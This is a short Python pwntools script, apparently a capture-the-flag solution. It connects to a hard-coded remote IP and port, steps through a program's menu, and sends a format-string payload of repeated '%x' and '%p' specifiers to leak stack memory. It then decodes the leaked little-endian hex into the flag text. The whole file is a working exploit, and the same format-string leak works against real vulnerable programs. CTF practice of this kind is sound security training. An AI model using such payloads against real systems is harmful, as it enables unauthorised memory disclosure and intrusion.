from pwn import *
r = remote("157.245.33.77", 30181)

def get_flag():
    r.sendline("name")
    r.recv()
    r.sendline("name")
    r.recv()
    r.sendline("2")
    r.recv()
    r.sendline("1")
    r.recv()
    r.sendline("2")
    r.recv()

    r.sendline("%x%x%x%x%x%x%x%x%x%x%x FLAG: %p%p%p%p%p%p%p%p%p%p%p")
    r.recvline_contains("The Man")
    response = r.recvline_contains("FLAG: ")
    r.close()
    response = response.decode("utf-8")
    response = response[response.find("FLAG: "):]
    response = response.replace("FLAG: ", "")
    return(response)

def flag_to_ascii(flag):
    decoded_flag = ""
    # Iterate through the little endian hex flag. Each chunk will be the data between two "0x"'s 
    for chunk in flag.split("0x")[1:]:
        # Reduce function calls to length
        length = len(chunk)
        # Iterate through each chunk, step by 2 to not overlap
        for i in range(0, length, 2):
            # Append string with ascii character converted from hex value
            decoded_flag += (chr(int("0x" + chunk[length-2-i:length-i],16)))
    return(decoded_flag)

print(flag_to_ascii(get_flag()))
